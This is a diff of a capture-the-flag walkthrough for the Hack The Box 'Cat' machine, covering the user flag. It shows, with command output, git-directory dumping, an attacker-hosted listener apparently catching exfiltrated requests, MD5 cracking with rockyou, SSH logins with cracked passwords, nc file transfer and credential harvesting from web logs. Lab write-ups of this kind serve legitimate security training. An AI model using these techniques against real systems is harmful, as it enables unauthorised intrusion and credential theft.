@@ -1,10 +1,12 @@
 # cat.htb
-https://app.hackthebox.com/machines/Cat
+## https://app.hackthebox.com/machines/Cat
+
+### --- USER FLAG ---
 
 ```
 sudo nmap -sC -sV -p- -T5 --max-rate 10000 10.10.11.53
 
-Hexada@hexada ~/Downloads$ sudo nmap -sC -sV -p- -T5 --max-rate 10000 10.10.11.53                                                                                                     1 ↵  
+Hexada@hexada ~/Downloads$ sudo nmap -sC -sV -p- -T5 --max-rate 10000 10.10.11.53                                                                                               
 [sudo] password for Hexada: 
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-26 10:54 EEST
 Warning: 10.10.11.53 giving up on port because retransmission cap hit (2).
@@ -144,7 +146,7 @@ Hexada@hexada ~/Downloads$ curl http://cat.htb/.git/refs/heads/master
 `.git/objects/xx/yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy`
 
 ```
-Hexada@hexada ~/app/vrm/cat.htb$ curl http://cat.htb/.git/objects/8c/2c2701eb4e3c9a42162cfb7b681b6166287fd5 --output 8c2c27_object                                                    8 ↵  
+Hexada@hexada ~/app/vrm/cat.htb$ curl http://cat.htb/.git/objects/8c/2c2701eb4e3c9a42162cfb7b681b6166287fd5 --output 8c2c27_object                                                 
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
 100   121  100   121    0     0    810      0 --:--:-- --:--:-- --:--:--   812
@@ -161,14 +163,14 @@ Cat v1
 ```
 
 ```
-(myenv) Hexada@hexada ~/app/pentesting-tools/GitHacker$ githacker --url http://cat.htb/.git/ --output-folder /home/Hexada/app/vrm/cat.htb/git                                   2 ↵ master 
+(myenv) Hexada@hexada ~/app/pentesting-tools/GitHacker$ githacker --url http://cat.htb/.git/ --output-folder /home/Hexada/app/vrm/cat.htb/git                                
 2025-04-27 10:15:42 INFO 1 urls to be exploited
 2025-04-27 10:15:42 INFO Exploiting http://cat.htb/.git/ into /home/Hexada/app/vrm/cat.htb/git/cbd584a870bc23c228bfffe42f75330d
 2025-04-27 10:15:43 INFO Downloading basic files...
 ```
 
 ```
-(myenv) Hexada@hexada ~/app/vrm/cat.htb/git/cbd584a870bc23c228bfffe42f75330d$ ls                                                                                                    master 
+(myenv) Hexada@hexada ~/app/vrm/cat.htb/git/cbd584a870bc23c228bfffe42f75330d$ ls                                                                                                 
 accept_cat.php  admin.php  config.php  contest.php  css  delete_cat.php  img  img_winners  index.php  join.php  logout.php  view_cat.php  vote.php  winners  winners.php
 ```
 
@@ -202,7 +204,7 @@ Priority: u=0, i
 ```
 
 ```
-(myenv) Hexada@hexada ~/app/vrm/cat.htb/git/cbd584a870bc23c228bfffe42f75330d$ sudo python3 -m http.server 1717 --bind 10.10.16.59                                                   master 
+(myenv) Hexada@hexada ~/app/vrm/cat.htb/git/cbd584a870bc23c228bfffe42f75330d$ sudo python3 -m http.server 1717 --bind 10.10.16.59                                                 ==
 [sudo] password for Hexada: 
 Serving HTTP on 10.10.16.59 port 1717 (http://10.10.16.59:1717/) ...
 10.10.11.53 - - [29/Apr/2025 00:30:35] code 404, message File not found
@@ -279,3 +281,119 @@ d1bbba3670feb9435c9841e46e60ee2f
 ac369922d560f17d6eeb8b2c7dec498c
 ```
 
+```
+hashcat -m 0 -a 0 hashes.txt /home/Hexada/pentest-env/pentesting-wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt -o passwords.txt
+
+Host memory required for this attack: 1027 MB
+
+Dictionary cache hit:
+* Filename..: /home/Hexada/pentest-env/pentesting-wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt
+* Passwords.: 14344384
+* Bytes.....: 139921497
+* Keyspace..: 14344384
+```
+
+```
+Hexada@hexada ~/pentest-env/vrm/cat.htb$ cat passwords.txt                                                  
+ac369922d560f17d6eeb8b2c7dec498c:soyuna*****
+```
+
+```
+Hexada@hexada ~/pentest-env/vrm/cat.htb$ ssh rosa@cat.htb                                                
+The authenticity of host 'cat.htb (10.10.11.53)' can't be established.
+ED25519 key fingerprint is SHA256:tsmOV3JuQkCv6HNUqg9YQ+DJznLS2nYKJl4zIwKtbE4.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'cat.htb' (ED25519) to the list of known hosts.
+rosa@cat.htb's password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-204-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Thu 03 Jul 2025 10:05:28 PM UTC
+
+  System load:           0.62
+  Usage of /:            54.4% of 6.06GB
+  Memory usage:          25%
+  Swap usage:            2%
+  Processes:             249
+  Users logged in:       1
+  IPv4 address for eth0: 10.10.11.53
+  IPv6 address for eth0: dead:beef::250:56ff:fe94:99e1
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Thu Jul  3 19:39:40 2025 from 10.10.14.180
+rosa@cat:~$ 
+```
+
+```
+rosa@cat:~$ nc -lnvp 1818 > linpeas.sh
+
+(myenv) Hexada@hexada ~/pentest-env/pentesting-tools$ nc 10.10.11.53 1818 < linpeas.sh
+```
+
+```
+rosa@cat:~$ cat /var/log/apache2/access.log
+```
+
+![image](https://github.com/user-attachments/assets/e072abae-d76d-4396-9228-72f01136622b)
+
+```
+Hexada@hexada ~/pentest-env/vrm/cat.htb$ ssh axel@cat.htb                                                                                                           ✚ ✭master 
+axel@cat.htb's password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-204-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Thu 03 Jul 2025 10:56:08 PM UTC
+
+  System load:           0.69
+  Usage of /:            54.5% of 6.06GB
+  Memory usage:          28%
+  Swap usage:            2%
+  Processes:             257
+  Users logged in:       2
+  IPv4 address for eth0: 10.10.11.53
+  IPv6 address for eth0: dead:beef::250:56ff:fe94:99e1
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+You have mail.
+Last login: Thu Jul  3 22:34:29 2025 from 10.10.16.105
+axel@cat:~$ ls
+user.txt
+axel@cat:~$ cat user.txt
+b75e6e00098a3d6c86922*****
+axel@cat:~$ 
+```
+
+### --- ROOT FLAG ---
